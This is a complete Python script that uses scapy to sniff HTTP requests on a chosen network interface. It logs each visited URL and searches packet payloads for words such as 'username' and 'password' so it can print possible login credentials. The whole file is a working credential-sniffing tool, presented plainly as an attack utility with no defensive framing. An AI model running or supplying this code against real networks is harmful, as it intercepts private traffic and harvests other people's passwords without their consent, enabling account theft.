#!usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import optparse

def getArgs():
    parser = optparse.OptionParser()

    parser.add_option("-i", "--interface", dest="interface", help="Interface to sniff")
    
    options, arguments = parser.parse_args()
    
    if not options.interface:
        parser.error("[-] Please specify a interface, use --help for more info.")

    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        print(f"[+] HTTP Request >> {url} ")
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "user", "uname", "login", "password", "pass"]
            for key in keywords:
                if key in load:
                    print(f"\n\n[+] Possible username/password > {load}\n\n")
                    break
    
options = getArgs()
sniff(options.interface)